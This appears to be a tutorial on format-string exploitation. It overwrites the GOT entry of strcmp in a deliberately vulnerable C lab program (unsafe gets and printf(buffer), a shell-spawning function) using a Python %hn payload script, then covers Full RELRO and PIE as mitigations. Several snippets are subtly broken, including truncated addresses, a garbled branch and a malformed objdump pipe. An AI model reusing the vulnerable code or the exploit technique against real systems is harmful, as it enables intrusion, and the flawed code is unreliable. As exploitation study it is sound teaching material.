# Rewriting the GOT

**vuln05.c**

```c
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

char password[] = "Nz!Tvq4s!Q5ttx1se"; // password = My Sup3r P4ssw0rd

void grant_access(){
    printf("\n[+] Access granted to super terminal:\n");
    system("/bin/sh");
}

void main(){
        char buffer[512];
        for(char *c = password ; *c ; ++c)
               *c -= 1;
        printf("Insert password: ");
        gets(buffer,sizeof(buffer),stdin);
        printf("Validating password: ");
        printf(buffer);
        if (!strcmp(password,buffer))
                grant_access();
        else
                printf("\n[-] Access denied to pwd = %s \n",buffer);
}
```

- Compile with the following to compile with relocations read-only that won't allow to write to the GOT

```
gcc -Wl, -z, relro, -z, now vuln05.c -o vuln05
```

- Compile with the following to compile with Position Independent Execution (PIE) support.

```
gcc -pie vuln05.c -o vuln05
```

## The vulnerability

- The above program has the same vulnerability in the printf
- But there is a call to the function `grant_access()`
- One way we can get shell here is by rewriting the pointer to the `strcmp` to point to the pointer of the function `grant_access()`
- The pointer should be changed by the exploitable printf and when strcmp is called it would jump to the `grant_access()`

- Compiling the binary in a 32-bit Ubuntu system with ASLR enabled with the default settings

```
gcc vuln05.c -o vuln05
```

- Checking the security of the binary using checksec we see that
- The binary has canary
- The binary does NOT have PIE enabled
- The binary has Partial Relro

- The vulnerability of the ELF when the PIE disabled is when you have the ability to write to the table containing the function code addresses of the library functions called GOT
- In this way when the process calls the next function, it will jump to another position in memory and execute what we want it to execute

- It also has Partial Relocations Read-Only
- This means that the GOT, which is in a section called `.got.plt` is writable

## Attack Path

- The GOT entry pointing to the strcmp function is where we will write the pointer to the `grant_access()` function
- To replace the address at the `strcmplib` function, we need to understand how these library calls are made at runtime using Procedure Linkage Table (PLT) and GOT
- The PLT is basically the code, also known as stub, that then jumps to a memory address populated at runtime by the operating system.
- In Windows this would be the Import Address Table (IAT) in Portable Executable(PE) files

- If you disassemble the main function and see where the `strcmp` function is jumping to in PLT 
- You see that there another jump to a position pointed by this value

- This relationship between the pointer is called the GOT table

- We need to know the position where we need to write to
- Check the security of the binary, we find that PIE is disabled
- Find the address using objdump

```
objdump -R vuln05
```


- We will write to the `strmcmp@GLIBC` 
- We will write the value of the `grant_access` function

```
objdump -t vuln05 | grant_access
```

- For the DPA of our payload

```
python3 -c 'print("AAAA" + " %x "*10)' | ./vuln05
```

- This will show that our string is in the 7th parameter

## Creating the Exploit

- Using this info, we can create our own exploit

```py
import struct

what = 0x080485b # grant_access
where = 0x804ac # strcmp
DPA = 7

where_high = where + 2
what_low = what & 0x0000ffff
what_high = (what & 0xffff0000) >> 16

buf = ""
buf += struct.pack("<I", where)
buf += struct.pack("<I", where_high)

count = what_low - len(buf)

buf += "%" + str(count) + "p"
buf += "%" + str(DPA) + "$hn"

if what_high < what_low:
	count = (0x10000 + what_high) - what_low
	count = what_high - what_low

else:
	buf += "%" + str(count) + "p"
	buf += "%" + str(DPA+1) + "$hn"

print(buf)
```

- Running it by directly piping it to the binary won't work

```
python3 x.py > x && cat x | ./vuln05
```

- Here the file descriptor is zero
- Staying open when you pipe the output this way
- To bypass this is to pipe it to another `cat`, without arguments to keep it open

```
python3 x.py > x && (cat x; cat) | ./vuln05
```

**NOTE**

The GOT writing is only possible because

- We can write to that position in memory
- Its address is known in advance

- Check the permissions on that memory address of strcmp@plt 

```
vmmap 0x804a00c
```

- We see that there is write permission

- However, if we were to compile it with the following flag

```
gcc -Wl, -z, relro, -z, now vuln05.c -o vuln05
```

- Running checksec would show that there is full Relro
- Check the same memory address
- We see that there is no write permission

- Another protection is creating position independent code (PIE)

```
gcc -pie vuln05.c -o vuln05
```

 - It randomizes the GOT table and the code location